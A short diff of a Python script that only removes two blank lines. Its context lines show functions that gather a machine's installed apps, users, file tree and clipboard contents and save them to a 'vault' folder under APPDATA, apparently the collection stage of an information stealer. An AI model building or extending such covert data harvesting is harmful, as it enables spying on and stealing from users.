@@ -5,7 +5,6 @@ import platform
 import psutil
 import threading
 import uuid
-
 def gather_system_info():
     def fetch_data(installed_apps, users, file_tree, clipboard_content):
         try:
@@ -64,7 +63,6 @@ def gather_system_info():
         'File Tree': file_tree,
         'Clipboard': clipboard_content
     }
-
 def save_data(data):
     try:
         vault_path = os.path.join(os.getenv('APPDATA'), 'vault', 'data')
